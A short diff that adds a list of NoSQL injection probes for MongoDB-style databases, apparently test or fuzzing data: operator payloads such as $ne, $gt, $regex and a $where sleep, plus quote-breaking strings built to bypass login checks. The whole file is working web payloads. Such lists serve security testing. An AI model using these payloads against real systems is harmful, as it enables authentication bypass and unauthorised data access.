@@ -1,0 +1,10 @@
+## NoSQL injection probes (MongoDB-style operators, as raw strings and JSON)
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "sleep(5000)"}
+[$ne]=1
+' || '1'=='1
+admin' || 'a'=='a
+'; return true; var x='
+true, $where: '1 == 1'
